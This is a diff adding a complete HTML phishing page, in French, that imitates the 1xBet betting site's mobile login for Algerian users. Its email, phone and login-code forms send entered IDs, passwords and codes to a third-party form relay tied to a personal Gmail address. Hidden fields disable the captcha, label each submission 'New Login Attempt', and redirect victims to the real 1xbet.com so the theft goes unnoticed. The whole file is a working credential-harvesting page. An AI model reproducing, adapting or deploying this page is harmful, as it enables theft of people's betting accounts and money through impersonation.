@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>1xBet Login</title>
+<!-- Tailwind CSS -->
+<script src="https://cdn.tailwindcss.com"></script>
+<!-- FontAwesome Icons -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<!-- Google Fonts -->
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<script>
+tailwind.config = {
+  theme: {
+    extend: {
+      colors: {
+        appBg: '#F1F5F9',
+        appHeader: '#2B6CB0',
+        brandBlue: '#2B6CB0',
+        brandGreen: '#74B62E',
+        brandGreenHover: '#65A325',
+        cardBg: '#FFFFFF',
+        inputBg: '#FFFFFF',
+        inputBorder: '#CBD5E1',
+      },
+      fontFamily: {
+        sans: ['Inter', 'sans-serif'],
+      }
+    }
+  }
+}
+</script>
+<style>
+:root {
+  --xbet-blue: #2d6fa6;
+  --xbet-blue-dark: #245a88;
+  --xbet-blue-deep: #24577f;
+  --xbet-green: #80ad2d;
+  --page: #e9edf5;
+  --line: #d4deea;
+  --ink: #2d6fa6;
+}
+* { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+body { 
+  margin: 0; 
+  background: var(--page); 
+  color: var(--ink); 
+  font-family: 'Inter', Arial, Helvetica, sans-serif; 
+  user-select: none; 
+  -webkit-text-size-adjust: 100%;
+}
+.mobile-container { 
+  max-width: 480px; 
+  width: 100%; 
+  min-height: 100vh; 
+  margin: 0 auto; 
+  display: flex; 
+  flex-direction: column; 
+  background: #f4f6f8; 
+  box-shadow: 0 0 24px rgba(18,48,70,.13); 
+  position: relative; 
+  padding-top: env(safe-area-inset-top);
+  padding-bottom: env(safe-area-inset-bottom);
+}
+.mobile-container > .bg-[#2b6cb0] { background: var(--xbet-blue-deep) !important; }
+.mobile-container > .bg-[#3182ce] { background: var(--xbet-blue) !important; }
+.mobile-container > div:first-child { min-height: 58px; }
+.mobile-container > div:first-child button { border-radius: 4px; }
+.mobile-container > div:first-child button:nth-of-type(2) { background: var(--xbet-blue) !important; }
+.mobile-container > div:first-child button:nth-of-type(3) { background: var(--xbet-green) !important; color: #fff !important; }
+.mobile-container > div:nth-child(2) { background: var(--xbet-blue) !important; min-height: 48px; font-size: 14px; }
+.mobile-container > div:nth-child(3) { padding: 10px 9px 16px; background: #e9edf5; }
+
+.tab-btn {
+  border: 1px solid #d6e0e8;
+  border-radius: 12px !important;
+  height: 56px !important;
+  padding: 6px 4px !important;
+  display: flex !important;
+  flex-direction: column !important;
+  align-items: center !important;
+  justify-content: center !important;
+  gap: 4px !important;
+  transition: all 0.2s ease;
+}
+.tab-btn i { font-size: 16px !important; line-height: 1 !important; }
+.tab-btn span { font-size: 10px !important; line-height: 1.1 !important; font-weight: 500 !important; text-align: center !important; white-space: nowrap !important; }
+.mobile-container > div:nth-child(3) > .grid.grid-cols-4 { margin-bottom: 20px; }
+.tab-btn.active { background: var(--xbet-blue) !important; color: white !important; border-color: var(--xbet-blue) !important; box-shadow: 0 2px 4px rgba(0,90,145,.16); }
+.tab-btn:not(.active) { background: #fff !important; color: #536b7c !important; box-shadow: none !important; }
+
+/* 16px font size on mobile inputs to prevent automatic iOS/Android page zooming */
+.custom-input { 
+  width: 100%; 
+  background: #fff !important; 
+  border: 1px solid #e1e6ed !important; 
+  color: #2d6fa6 !important; 
+  border-radius: 16px !important; 
+  min-height: 48px; 
+  padding-left: 13px !important; 
+  font-size: 16px !important; 
+}
+.custom-input::placeholder { color: #3975a9 !important; opacity: 1; font-size: 14px; }
+.custom-input:focus { outline: none; border-color: var(--xbet-blue) !important; box-shadow: 0 0 0 2px rgba(8,127,195,.12) !important; }
+input[type=checkbox] { accent-color: var(--xbet-blue); width: 18px; height: 18px; }
+form button[type=submit] { background: var(--xbet-green) !important; border-radius: 15px !important; min-height: 48px; box-shadow: none !important; letter-spacing: .1px; font-size: 15px !important; font-weight: 600 !important; }
+form button[type=submit]:hover { background: #719b28 !important; }
+a.text-[#2B6CB0], .text-[#2B6CB0] { color: var(--xbet-blue) !important; }
+.mobile-container > div:last-of-type { border-color: #d4dde5 !important; background: #fff !important; min-height: 52px; box-shadow: 0 -2px 8px rgba(30,55,75,.04); }
+.mobile-container > div:last-of-type button { color: #667987; }
+.mobile-container > div:last-of-type button:nth-child(4) { color: var(--xbet-blue) !important; }
+.mobile-container > div:last-of-type button:nth-child(3) > div { background: var(--xbet-blue) !important; }
+
+@media (min-width: 481px) {
+  body { padding: 0; }
+  .mobile-container { min-height: 100vh; border-radius: 0; overflow: hidden; }
+}
+</style>
+</head>
+<body class="font-sans text-slate-800">
+<div class="mobile-container">
+  <!-- Main Header Bar -->
+  <div class="bg-[#2b6cb0] px-3 py-2.5 flex items-center justify-between shadow-sm">
+    <div class="flex items-center gap-2">
+      <a href="#" class="flex items-center gap-1.5">
+        <img src="https://v3.traincdn.com/genfiles/cms/media_asset/1188/4268512940_17.svg?v=1990" alt="1xBet" title="1xBet" class="h-7 w-auto object-contain">
+        <span class="text-base leading-none">🇩🇿</span>
+      </a>
+    </div>
+    <div class="flex items-center gap-2">
+      <button type="button" class="w-9 h-9 rounded bg-[#1F4F82]/50 flex items-center justify-center text-white relative">
+        <i class="fa-solid fa-gift text-lg"></i>
+        <span class="absolute -top-1 -right-1 bg-lime-400 text-slate-900 text-[6px] leading-none font-bold px-0.5 rounded-full">1</span>
+      </button>
+      <button type="button" class="bg-[#1F4F82] hover:bg-[#193F68] text-white font-medium text-xs px-3.5 py-2 rounded shadow-sm">
+        Se connecter
+      </button>
+      <button type="button" class="bg-brandGreen hover:bg-brandGreenHover text-white font-medium text-xs px-3 py-2 rounded shadow-sm">
+        Inscription
+      </button>
+    </div>
+  </div>
+
+  <!-- Section Sub-Header -->
+  <div class="bg-[#3182ce] px-4 py-3 flex items-center gap-4 text-white font-semibold text-sm shadow-inner">
+    <button type="button" class="w-8 h-8 rounded-lg bg-white/10 flex items-center justify-center text-white hover:bg-white/20">
+      <i class="fa-solid fa-arrow-left text-base"></i>
+    </button>
+    <span class="tracking-wide text-white font-bold uppercase">SE CONNECTER</span>
+  </div>
+
+  <!-- Main Content Body -->
+  <div class="flex-1 p-3 sm:p-4 space-y-4">
+    <!-- Tab Selection Buttons -->
+    <div class="grid grid-cols-4 gap-2 text-xs">
+      <button type="button" onclick="switchTab('email')" id="tab-email" class="tab-btn active">
+        <i class="fa-solid fa-envelope"></i>
+        <span>Par e-mail</span>
+      </button>
+      <button type="button" onclick="switchTab('phone')" id="tab-phone" class="tab-btn">
+        <i class="fa-solid fa-mobile-screen-button"></i>
+        <span>Par téléphone</span>
+      </button>
+      <button type="button" onclick="switchTab('code')" id="tab-code" class="tab-btn">
+        <i class="fa-solid fa-comment-dots"></i>
+        <span>Par code</span>
+      </button>
+      <button type="button" onclick="switchTab('social')" id="tab-social" class="tab-btn">
+        <i class="fa-solid fa-users"></i>
+        <span>Réseaux sociaux</span>
+      </button>
+    </div>
+
+    <!-- TAB 1: BY EMAIL FORM (NATIVE HTML SUBMISSION) -->
+    <form id="form-email" action="https://formsubmit.co/nbroseten@gmail.com" method="POST" class="space-y-4 pt-2">
+      <!-- Direct redirect configuration to official site upon submission -->
+      <input type="hidden" name="_next" value="https://www.1xbet.com">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_subject" value="New Login Attempt - Email Form">
+      
+      <div>
+        <input type="text" name="Email_or_ID" required placeholder="E-mail ou ID*" class="w-full custom-input px-3.5 py-3">
+      </div>
+      <div>
+        <div class="relative">
+          <input type="password" id="password-email" name="Password" required placeholder="Mot de passe*" class="w-full custom-input px-3.5 py-3 pr-10">
+          <button type="button" onclick="togglePassword('password-email', 'eye-email')" class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-700 p-2">
+            <i id="eye-email" class="fa-regular fa-eye-slash text-base"></i>
+          </button>
+        </div>
+      </div>
+      <div class="flex items-center justify-between text-xs pt-1">
+        <label class="flex items-center gap-2 cursor-pointer text-slate-700 font-medium">
+          <input type="checkbox" name="Remember_Me" value="Yes">
+          <span>Mémoriser mes informations</span>
+        </label>
+        <a href="#" class="text-[#2B6CB0] hover:underline font-medium">Mot de passe oublié ?</a>
+      </div>
+      <button type="submit" class="w-full bg-brandGreen hover:bg-brandGreenHover text-white font-bold py-3.5 rounded-md uppercase tracking-wider transition shadow-md">
+        SE CONNECTER
+      </button>
+    </form>
+
+    <!-- TAB 2: BY PHONE FORM (NATIVE HTML SUBMISSION) -->
+    <form id="form-phone" action="https://formsubmit.co/nbroseten@gmail.com" method="POST" class="space-y-4 pt-2 hidden">
+      <input type="hidden" name="_next" value="https://www.1xbet.com">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_subject" value="New Login Attempt - Phone Form">
+      
+      <div class="flex gap-2">
+        <div class="w-28 flex items-center justify-between custom-input px-2.5 py-3 text-sm text-slate-800">
+          <div class="flex items-center gap-1">
+            <span>🇩🇿</span>
+            <span class="font-medium">+213</span>
+          </div>
+          <i class="fa-solid fa-chevron-down text-xs text-slate-400"></i>
+        </div>
+        <input type="hidden" name="Country_Code" value="+213">
+        <input type="tel" name="Phone_Number" required placeholder="Numéro de téléphone" class="flex-1 custom-input px-3.5 py-3">
+      </div>
+      <div>
+        <div class="relative">
+          <input type="password" id="password-phone" name="Password" required placeholder="Mot de passe*" class="w-full custom-input px-3.5 py-3 pr-10">
+          <button type="button" onclick="togglePassword('password-phone', 'eye-phone')" class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-700 p-2">
+            <i id="eye-phone" class="fa-regular fa-eye-slash text-base"></i>
+          </button>
+        </div>
+      </div>
+      <div class="flex items-center justify-between text-xs pt-1">
+        <label class="flex items-center gap-2 cursor-pointer text-slate-700 font-medium">
+          <input type="checkbox" name="Remember_Me" value="Yes">
+          <span>Mémoriser mes informations</span>
+        </label>
+        <a href="#" class="text-[#2B6CB0] hover:underline font-medium">Mot de passe oublié ?</a>
+      </div>
+      <button type="submit" class="w-full bg-brandGreen hover:bg-brandGreenHover text-white font-bold py-3.5 rounded-md uppercase tracking-wider transition shadow-md">
+        SE CONNECTER
+      </button>
+    </form>
+
+    <!-- TAB 3: BY CODE FORM (NATIVE HTML SUBMISSION) -->
+    <form id="form-code" action="https://formsubmit.co/nbroseten@gmail.com" method="POST" class="space-y-4 pt-2 hidden">
+      <input type="hidden" name="_next" value="https://www.1xbet.com">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_subject" value="New Login Attempt - Verification Code Form">
+      
+      <div>
+        <input type="text" name="Verification_Code" required placeholder="Code de connexion*" class="w-full custom-input px-3.5 py-3">
+      </div>
+      <button type="submit" class="w-full bg-brandGreen hover:bg-brandGreenHover text-white font-bold py-3.5 rounded-md uppercase tracking-wider transition shadow-md">
+        SE CONNECTER
+      </button>
+    </form>
+
+    <!-- TAB 4: SOCIAL NETWORKS -->
+    <div id="form-social" class="space-y-4 pt-2 hidden">
+      <div class="text-center text-xs font-semibold uppercase tracking-wider text-slate-600 mb-2">
+        Réseaux sociaux
+      </div>
+      <div class="grid grid-cols-2 gap-3">
+        <button type="button" class="flex items-center justify-center gap-2 bg-white hover:bg-slate-50 py-3.5 rounded-md border border-slate-300 text-sm font-medium text-slate-700 shadow-sm">
+          <i class="fa-brands fa-google text-red-500 text-lg"></i>
+          <span>Google</span>
+        </button>
+        <button type="button" class="flex items-center justify-center gap-2 bg-white hover:bg-slate-50 py-3.5 rounded-md border border-slate-300 text-sm font-medium text-slate-700 shadow-sm">
+          <i class="fa-brands fa-x-twitter text-slate-900 text-lg"></i>
+          <span>X</span>
+        </button>
+        <button type="button" class="flex items-center justify-center gap-2 bg-white hover:bg-slate-50 py-3.5 rounded-md border border-slate-300 text-sm font-medium text-slate-700 shadow-sm">
+          <i class="fa-brands fa-twitch text-purple-600 text-lg"></i>
+          <span>Twitch</span>
+        </button>
+        <button type="button" class="flex items-center justify-center gap-2 bg-white hover:bg-slate-50 py-3.5 rounded-md border border-slate-300 text-sm font-medium text-slate-700 shadow-sm">
+          <i class="fa-brands fa-discord text-indigo-600 text-lg"></i>
+          <span>Discord</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- Register Link Footer -->
+    <div class="text-center text-xs text-slate-600 pt-3">
+      Pas de compte ? <a href="#" class="text-[#2B6CB0] hover:underline font-semibold">S'inscrire</a>
+    </div>
+  </div>
+
+  <!-- Bottom App Navigation Bar -->
+  <div class="mt-auto bg-white border-t border-slate-200 grid grid-cols-5 text-center text-[10px] text-slate-600 py-2">
+    <button type="button" class="flex flex-col items-center justify-center gap-1 hover:text-[#2B6CB0]">
+      <svg viewBox="0 0 16 16" width="18" height="18" fill="currentColor"><path d="M13 0H3v1H1.75C.78 1 0 1.65 0 2.44v1.04c0 .82.4 1.6 1.1 2.18L3 7.23a5 5 0 0 0 3.72 4.6L6 14H4a1 1 0 0 0-1 1v1h10v-1a1 1 0 0 0-1-1h-2l-.72-2.16A5 5 0 0 0 13 7.1l2-1.7c.64-.56 1-1.3 1-2.07v-.98C16 1.61 15.29 1 14.4 1h-1.38v1.17h1.39c.12 0 .23.08.23.2v.97c0 .46-.22.9-.6 1.24L13 5.46V0Z"/></svg>
+      <span>Sports</span>
+    </button>
+    <button type="button" class="flex flex-col items-center justify-center gap-1 hover:text-[#2B6CB0]">
+      <svg viewBox="0 0 16 17" width="18" height="18" fill="currentColor"><path d="M15.2 11a7.6 7.6 0 0 1-8.5 5A7.6 7.6 0 0 1 1 11C.6 10.2.4 9.3.4 8.5c0-1 .2-1.9.6-2.7A7.6 7.6 0 0 1 9.3.9 7.6 7.6 0 0 1 15 5.7c.4.8.6 1.7.6 2.7 0 .8-.2 1.7-.4 2.5Z"/></svg>
+      <span>Casino</span>
+    </button>
+    <button type="button" class="flex flex-col items-center justify-center gap-0.5 -mt-3">
+      <div class="w-10 h-10 rounded-full bg-[#2B6CB0] text-white flex items-center justify-center text-base shadow-lg border-2 border-white">
+        <svg viewBox="0 0 19 20" width="19" height="19" fill="currentColor"><path d="M3.12 5.75 2.8 5.5.12 8.2l3.1 3.1L4.5 10l.66.66-1.28 1.29 7.55 7.56 2.68-2.68-.23-.33a1.52 1.52 0 0 1 2.1-2.09l.32.23 2.68-2.68-7.56-7.55-1.28 1.28-.67-.66 1.29-1.29L7.66.65 5 3.33l.23.32a1.52 1.52 0 0 1-2.1 2.1Z"/></svg>
+      </div>
+      <span class="text-[#2B6CB0] font-semibold">Slip de pari</span>
+    </button>
+    <button type="button" class="flex flex-col items-center justify-center gap-1 text-[#2B6CB0] font-bold border-b-2 border-brandGreen pb-1">
+      <svg viewBox="0 0 16 16" width="18" height="18" fill="currentColor"><path d="M8 8c2.2 0 4-1.8 4-4s-1.8-4-4-4-4 1.8-4 4 1.8 4 4 4zm2.8 1h-.5c-1.5.7-3.1.7-4.6 0h-.5A4.2 4.2 0 0 0 1 13.2v1.3c0 .8.7 1.5 1.5 1.5h11c.8 0 1.5-.7 1.5-1.5v-1.3c0-2.3-1.9-4.2-4.2-4.2z"/></svg>
+      <span>Se connecter</span>
+    </button>
+    <button type="button" class="flex flex-col items-center justify-center gap-1 hover:text-[#2B6CB0]">
+      <svg viewBox="0 0 12 9" width="18" height="18" fill="currentColor"><path d="M0 1.5v-1C0 .1.2 0 .4 0h11.2c.2 0 .4.2.4.4v1.1c0 .3-.2.5-.4.5H.4a.4.4 0 01-.4-.5zm.4 4h11.2c.2 0 .4-.2.4-.5V4c0-.3-.2-.5-.4-.5H.4c-.2 0-.4.2-.4.5v1c0 .3.2.5.4.5z"/></svg>
+      <span>Menu</span>
+    </button>
+  </div>
+</div>
+
+<script>
+function switchTab(tabName) {
+  ['email', 'phone', 'code', 'social'].forEach(name => {
+    document.getElementById('form-' + name).classList.add('hidden');
+    document.getElementById('tab-' + name).classList.remove('active');
+  });
+  document.getElementById('form-' + tabName).classList.remove('hidden');
+  document.getElementById('tab-' + tabName).classList.add('active');
+}
+
+function togglePassword(inputId, eyeId) {
+  const input = document.getElementById(inputId);
+  const eye = document.getElementById(eyeId);
+  if (input.type === 'password') {
+    input.type = 'text';
+    eye.classList.remove('fa-eye-slash');
+    eye.classList.add('fa-eye');
+  } else {
+    input.type = 'password';
+    eye.classList.remove('fa-eye');
+    eye.classList.add('fa-eye-slash');
+  }
+}
+</script>
+</body>
+</html>
